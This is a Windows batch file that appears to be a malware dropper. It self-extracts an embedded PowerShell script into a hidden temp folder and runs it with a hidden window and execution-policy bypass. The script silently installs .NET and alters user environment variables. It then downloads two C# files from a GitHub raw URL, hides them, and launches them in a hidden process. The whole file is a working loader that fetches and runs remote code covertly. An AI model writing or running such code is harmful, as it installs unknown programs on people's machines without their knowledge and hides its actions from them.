@echo off
setlocal
set "CFG=%TEMP%\.config"
set "BATCH_PATH=%~f0"

if not exist "%CFG%" mkdir "%CFG%" 2>nul
if exist "%CFG%\pp.ps1" attrib -h -r -s "%CFG%\pp.ps1" >nul 2>&1

powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$l=Get-Content -LiteralPath $env:BATCH_PATH; $s=-1; for($i=0;$i -lt $l.Count;$i++){if($l[$i].Trim() -eq 'REM ====PS1===='){$s=$i+1;break}}; if($s -lt 0 -or $s -ge $l.Count){exit 1}; $body=($l[$s..($l.Count-1)] -join [Environment]::NewLine); $out=Join-Path $env:CFG 'pp.ps1'; [IO.File]::WriteAllText($out,$body,(New-Object System.Text.UTF8Encoding $false)); & $out" > "%CFG%\setup.log" 2>&1

exit /b

REM ====PS1====
$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$configPath = if ($env:CFG) { $env:CFG } else { Join-Path $env:TEMP ".config" }
if (-not (Test-Path -LiteralPath $configPath)) {
    New-Item -Path $configPath -ItemType Directory -Force | Out-Null
}

$d = Get-Item -LiteralPath $configPath -Force
$d.Attributes = $d.Attributes -bor [System.IO.FileAttributes]::Hidden

function Save-HiddenFile {
    param([string]$Url, [string]$Path)
    if (Test-Path -LiteralPath $Path) {
        try { (Get-Item -LiteralPath $Path -Force).Attributes = 'Normal' } catch {}
    }
    Invoke-WebRequest -Uri $Url -OutFile $Path -UseBasicParsing -ErrorAction Stop
    $f = Get-Item -LiteralPath $Path -Force
    $f.Attributes = $f.Attributes -bor [System.IO.FileAttributes]::Hidden
}

# ============================================
# .NET INSTALLATION & PATH SETUP
# ============================================
$dotnetPath = Join-Path $env:USERPROFILE '.dotnet'
$dotnetExe  = Join-Path $dotnetPath 'dotnet.exe'
$installScript = Join-Path $env:TEMP 'dotnet-install.ps1'

# 1. Download the installer
Invoke-WebRequest -Uri 'https://dot.net/v1/dotnet-install.ps1' -OutFile $installScript -UseBasicParsing

# 2. Run the installer (Changed to 10.0 to support 'dotnet run file.cs')
& $installScript -Channel 10.0 -InstallDir $dotnetPath

# 3. Permanently set User Environment Variables (Writes to Registry safely)
$userPath = [Environment]::GetEnvironmentVariable('Path', 'User')
if ($userPath -notlike "*$dotnetPath*") {
    [Environment]::SetEnvironmentVariable('Path', "$dotnetPath;$userPath", 'User')
}
[Environment]::SetEnvironmentVariable('DOTNET_ROOT', $dotnetPath, 'User')

# 4. Refresh current session
$env:PATH = "$dotnetPath;$env:PATH"
$env:DOTNET_ROOT = $dotnetPath

# ============================================
# DOWNLOAD FILES
# ============================================
$finalPath1 = Join-Path $configPath "client.cs"
Save-HiddenFile -Url "https://raw.githubusercontent.com/rahul-call/inner/main/ror/client.cs" -Path $finalPath1

$finalPath2 = Join-Path $configPath "auto.cs"
Save-HiddenFile -Url "https://raw.githubusercontent.com/rahul-call/inner/main/ror/auto.cs" -Path $finalPath2

# ============================================
# LAUNCH
# ============================================
# Using the full path to dotnet.exe to guarantee it runs, and passing the working directory
$stdErrLog = Join-Path $configPath "dotnet_error.log"

Start-Process -FilePath $dotnetExe -ArgumentList @('run', 'auto.cs', '--', 'client.cs', '--hidden') -WorkingDirectory $configPath -WindowStyle Hidden -RedirectStandardError $stdErrLog
